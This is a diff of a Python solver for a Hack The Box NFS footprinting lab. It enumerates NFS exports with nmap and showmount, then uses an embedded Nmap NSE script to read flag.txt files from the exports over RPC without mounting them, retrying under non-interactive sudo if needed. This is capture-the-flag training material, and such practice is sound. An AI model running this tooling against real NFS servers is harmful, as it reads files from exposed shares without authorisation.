@@ -1,14 +1,37 @@
 #!/usr/bin/env python3
+"""NFS footprinting lab solver.
+
+Uses the nfs_enum package for full recon, then reads flag files via
+a custom NSE script that avoids a privileged mount.
+
+To add a new target: add an entry to TARGETS below.
+"""
+from __future__ import annotations
 
 import argparse
 import re
-import subprocess
+import sys
 import tempfile
 from pathlib import Path
-from typing import Dict, List, Tuple
 
+sys.path.insert(0, str(Path(__file__).parent))
 
-NSE_SCRIPT = r'''local rpc = require "rpc"
+from nfs_enum import NfsOrchestrator, ScanConfig, ScanOptions, ScanProfile
+
+# ---------------------------------------------------------------------------
+# Target registry — add new IPs here
+# ---------------------------------------------------------------------------
+TARGETS: dict[str, str] = {
+    "default": "10.129.202.5",
+    # "lab2": "10.129.x.x",
+}
+
+OUTPUT_DIR = Path("nfs_recon")
+
+# ---------------------------------------------------------------------------
+# NSE script for reading files without mounting (avoids privileged port req)
+# ---------------------------------------------------------------------------
+_NSE_SCRIPT = r'''local rpc = require "rpc"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
@@ -16,7 +39,6 @@ local string = require "string"
 portrule = shortport.port_or_service(111, "rpcbind", {"tcp", "udp"})
 
 description = [[Read a specific file from an NFS export via RPC LOOKUP/READ without mounting.]]
-
 author = "copilot"
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"discovery", "safe"}
@@ -121,113 +143,157 @@ end
 '''
 
 
-def run_cmd(cmd: List[str]) -> str:
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    if result.returncode != 0:
-        raise RuntimeError(result.stderr.strip() or result.stdout.strip() or f"Command failed: {' '.join(cmd)}")
-    return result.stdout
+# ---------------------------------------------------------------------------
+# Flag reading via NSE
+# ---------------------------------------------------------------------------
 
-
-def discover_exports(host: str) -> List[str]:
-    output = run_cmd([
-        "nmap",
-        "-Pn",
-        "-sV",
-        "-p111,2049",
-        "--script",
-        "nfs-showmount",
-        host,
-    ])
-
-    exports: List[str] = []
-    in_block = False
-    for line in output.splitlines():
-        if "| nfs-showmount:" in line:
-            in_block = True
-            continue
-        if in_block:
-            if line.strip().startswith("|_") or line.strip().startswith("|"):
-                m = re.search(r"(\/[^\s]+)", line)
-                if m:
-                    exports.append(m.group(1).strip())
-            else:
-                in_block = False
-
-    if not exports:
-        raise RuntimeError("No NFS exports found from nmap nfs-showmount output")
-    return exports
-
-
-def resolve_target_exports(exports: List[str]) -> Dict[str, str]:
-    result: Dict[str, str] = {}
-
-    for export in exports:
-        lower = export.lower()
-        if lower.endswith("/nfsshare"):
-            result["nfsshare"] = export
-        elif lower.endswith("/nfs"):
-            result["nfs"] = export
-
-    if "nfs" not in result or "nfsshare" not in result:
-        raise RuntimeError(f"Could not map required shares from exports: {exports}")
-
-    return result
-
-
-def read_flag_with_nse(host: str, nse_path: Path, export_path: str, use_sudo: bool) -> str:
+def _read_flag_nse(host: str, nse_path: Path, export_path: str, use_sudo: bool) -> str:
+    import subprocess
     base_cmd = [
-        "nmap",
-        "-Pn",
-        "-p111",
-        "--script",
-        str(nse_path),
-        "--script-args",
-        f"nfsread.share={export_path},nfsread.file=flag.txt",
+        "nmap", "-Pn", "-p111",
+        "--script", str(nse_path),
+        "--script-args", f"nfsread.share={export_path},nfsread.file=flag.txt",
         host,
     ]
     cmd = (["sudo", "-n"] + base_cmd) if use_sudo else base_cmd
-    output = run_cmd(cmd)
-
+    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    output = proc.stdout
+    if proc.returncode != 0 and not output:
+        raise RuntimeError(proc.stderr.strip() or f"nmap exited {proc.returncode}")
     m = re.search(r"content:\s*(.+)", output)
     if not m:
-        raise RuntimeError(f"Could not parse flag content for export {export_path}. Raw output:\n{output}")
+        raise RuntimeError(
+            f"Flag not found in NSE output for {export_path}.\nOutput:\n{output}"
+        )
     return m.group(1).strip()
 
 
-def solve(host: str) -> Tuple[str, str]:
-    exports = discover_exports(host)
-    mapped = resolve_target_exports(exports)
-
+def _read_flags(host: str, exports: list[str]) -> dict[str, str]:
+    flags: dict[str, str] = {}
     with tempfile.TemporaryDirectory(prefix="nfs_solver_") as tmpdir:
         nse_path = Path(tmpdir) / "nfs-readfile.nse"
-        nse_path.write_text(NSE_SCRIPT, encoding="utf-8")
+        nse_path.write_text(_NSE_SCRIPT, encoding="utf-8")
 
-        # Try unprivileged first; if mountd rejects it, retry with sudo.
-        try:
-            nfs_flag = read_flag_with_nse(host, nse_path, mapped["nfs"], use_sudo=False)
-            nfsshare_flag = read_flag_with_nse(host, nse_path, mapped["nfsshare"], use_sudo=False)
-            return nfs_flag, nfsshare_flag
-        except Exception as first_error:
-          try:
-            nfs_flag = read_flag_with_nse(host, nse_path, mapped["nfs"], use_sudo=True)
-            nfsshare_flag = read_flag_with_nse(host, nse_path, mapped["nfsshare"], use_sudo=True)
-            return nfs_flag, nfsshare_flag
-          except Exception as sudo_error:
-            raise RuntimeError(
-              "NFS reads require privileged RPC source ports in this environment. "
-              "Run the script as root (e.g., `sudo python nfs_footprint_solver.py <target>`). "
-              f"Unprivileged error: {first_error}. Privileged retry error: {sudo_error}"
-            ) from sudo_error
+        for export in exports:
+            for use_sudo in (False, True):
+                try:
+                    flags[export] = _read_flag_nse(host, nse_path, export, use_sudo)
+                    break
+                except Exception as e:
+                    if use_sudo:
+                        print(f"  [-] Could not read flag from {export}: {e}", file=sys.stderr)
+    return flags
+
+
+# ---------------------------------------------------------------------------
+# Export classification
+# ---------------------------------------------------------------------------
+
+def _classify_exports(export_paths: list[str]) -> dict[str, str]:
+    mapping: dict[str, str] = {}
+    for path in export_paths:
+        lower = path.lower()
+        if lower.endswith("/nfsshare"):
+            mapping["nfsshare"] = path
+        elif lower.endswith("/nfs"):
+            mapping["nfs"] = path
+        else:
+            # Store by last path component as key
+            key = path.rstrip("/").rsplit("/", 1)[-1] or path
+            mapping[key] = path
+    return mapping
+
+
+# ---------------------------------------------------------------------------
+# Main solver
+# ---------------------------------------------------------------------------
+
+def solve(host: str, skip_recon: bool = False) -> None:
+    print(f"\n=== NFS Lab Solver — target {host} ===\n")
+
+    config = ScanConfig(
+        target=host,
+        output_dir=OUTPUT_DIR,
+        profile=ScanProfile.STANDARD,
+        options=ScanOptions(attempt_mount=True),
+    )
+
+    if not skip_recon:
+        print("[*] Running nfs_enum package recon ...", file=sys.stderr)
+        orchestrator = NfsOrchestrator(config)
+        context = orchestrator.run()
+
+        if not context.nfs_detected:
+            print("[-] NFS not detected. Exiting.")
+            return
+
+        export_paths = [e.path for e in context.exports]
+        print(f"[+] Exports found: {export_paths}", file=sys.stderr)
+
+        report_path = config.target_output_dir / "summary" / "findings.md"
+        if report_path.exists():
+            print(f"[*] Report: {report_path}", file=sys.stderr)
+    else:
+        print("[*] Skipping recon (--skip-recon)", file=sys.stderr)
+        # Fall back to direct showmount
+        import subprocess
+        result = subprocess.run(
+            ["showmount", "-e", host], capture_output=True, text=True, timeout=30
+        )
+        export_paths = []
+        for line in result.stdout.splitlines():
+            m = re.match(r"^(/\S+)", line.strip())
+            if m:
+                export_paths.append(m.group(1))
+
+    if not export_paths:
+        print("[-] No exports found. Cannot read flags.")
+        return
+
+    classified = _classify_exports(export_paths)
+    print(f"\n[*] Reading flags via NSE script ...\n", file=sys.stderr)
+    flags = _read_flags(host, export_paths)
+
+    if not flags:
+        print("[-] No flags retrieved.")
+        return
+
+    print("\n=== FLAGS ===")
+    for export, flag in flags.items():
+        key = classified.get(export, export)
+        print(f"  {export}: {flag}")
+
+    # HTB-style Q&A output for /nfs and /nfsshare
+    if "nfs" in classified and classified["nfs"] in flags:
+        print(f"\nQ1 — /nfs flag:      {flags[classified['nfs']]}")
+    if "nfsshare" in classified and classified["nfsshare"] in flags:
+        print(f"Q2 — /nfsshare flag: {flags[classified['nfsshare']]}")
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description="Solve HTB NFS footprinting lab")
+    parser.add_argument(
+        "--target",
+        default=TARGETS["default"],
+        help=f"Target IP (default: {TARGETS['default']}). Named targets: {list(TARGETS.keys())}",
+    )
+    parser.add_argument(
+        "--target-name",
+        choices=list(TARGETS.keys()),
+        help="Select a named target from the registry",
+    )
+    parser.add_argument(
+        "--skip-recon",
+        action="store_true",
+        help="Skip nfs_enum recon phase and go straight to flag reading",
+    )
+    return parser.parse_args()
 
 
 def main() -> int:
-    parser = argparse.ArgumentParser(description="Solve HTB NFS footprinting lab")
-    parser.add_argument("host", help="Target IP or hostname")
-    args = parser.parse_args()
-
-    nfs_flag, nfsshare_flag = solve(args.host)
-    print(f"nfs flag: {nfs_flag}")
-    print(f"nfsshare flag: {nfsshare_flag}")
+    args = parse_args()
+    host = TARGETS[args.target_name] if args.target_name else args.target
+    solve(host, skip_recon=args.skip_recon)
     return 0
 
 
